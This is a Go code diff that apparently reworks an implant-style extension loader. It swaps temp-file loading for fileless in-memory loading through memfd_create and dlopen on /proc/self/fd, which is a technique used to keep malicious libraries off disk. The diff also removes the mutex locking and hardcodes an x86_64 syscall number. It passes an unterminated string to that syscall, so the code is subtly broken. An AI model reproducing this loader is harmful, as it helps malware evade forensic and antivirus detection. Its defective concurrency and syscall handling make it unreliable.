@@ -21,15 +21,15 @@ package extension
 */
 
 import (
-	// {{if .Config.Debug}}
+	"fmt"
 	"log"
-	// {{end}}
-	"os"
-	"sync"
+	"syscall"
 	"unsafe"
 
 	"github.com/ebitengine/purego"
 )
+
+const SYS_MEMFD_CREATE = 319 // Fallback definition for memfd_create on x86_64
 
 type LinuxExtension struct {
 	id          string
@@ -39,7 +39,6 @@ type LinuxExtension struct {
 	serverStore bool
 	init        string
 	onFinish    func([]byte)
-	sync.Mutex
 }
 
 func NewLinuxExtension(data []byte, id string, arch string, init string) *LinuxExtension {
@@ -60,25 +59,23 @@ func (d *LinuxExtension) GetArch() string {
 }
 
 func (d *LinuxExtension) Load() error {
-	d.Lock()
-	defer d.Unlock()
-
-	extTmpFile, err := createTempFile(d.data)
+	fd, err := createMemFd("extension")
 	if err != nil {
+		log.Printf("Failed to create memfd: %v", err)
 		return err
 	}
-	defer cleanupTempFile(extTmpFile)
-	d.module, err = purego.Dlopen(extTmpFile, purego.RTLD_NOW|purego.RTLD_GLOBAL)
+	err = writeToMemFd(fd, d.data)
 	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("couldn't purego.dlopen(): %v\n", err)
-		// {{end}}
+		log.Printf("Failed to write to memfd: %v", err)
 		return err
 	}
 
-	// if err := purego.Dlerror(); err != "" {
-	// 	return errors.New(err)
-	// }
+	path := "/proc/self/fd/" + itoa(fd)
+	d.module, err = purego.Dlopen(path, purego.RTLD_NOW|purego.RTLD_GLOBAL)
+	if err != nil {
+		log.Printf("Failed to load shared library from memfd: %v", err)
+		return err
+	}
 
 	if d.init != "" {
 		var initFunc func()
@@ -90,8 +87,6 @@ func (d *LinuxExtension) Load() error {
 }
 
 func (d *LinuxExtension) Call(export string, arguments []byte, onFinish func([]byte)) error {
-	d.Lock()
-	defer d.Unlock()
 	d.onFinish = onFinish
 	outCallback := purego.NewCallback(d.extensionCallback)
 	var exportFunc func([]byte, uint64, uintptr) uint32
@@ -106,19 +101,23 @@ func (d *LinuxExtension) extensionCallback(data uintptr, length uintptr) {
 	d.onFinish(outBytes)
 }
 
-func createTempFile(data []byte) (string, error) {
-	tmpFile, err := os.CreateTemp("", "")
-	if err != nil {
-		return "", err
+// createMemFd creates an in-memory file descriptor using the memfd_create syscall
+func createMemFd(name string) (int, error) {
+	fd, _, errno := syscall.Syscall(SYS_MEMFD_CREATE, uintptr(unsafe.Pointer(&[]byte(name)[0])), 0, 0)
+	if errno != 0 {
+		return -1, errno
 	}
-	defer tmpFile.Close()
-	_, err = tmpFile.Write(data)
-	if err != nil {
-		return "", err
-	}
-	return tmpFile.Name(), nil
+	return int(fd), nil
 }
 
-func cleanupTempFile(path string) error {
-	return os.Remove(path)
+// writeToMemFd writes the given data to the memory file descriptor
+func writeToMemFd(fd int, data []byte) error {
+	_, err := syscall.Write(fd, data)
+	return err
 }
+
+// itoa converts an integer to a string (quick helper function)
+func itoa(val int) string {
+	return fmt.Sprintf("%d", val)
+}
+
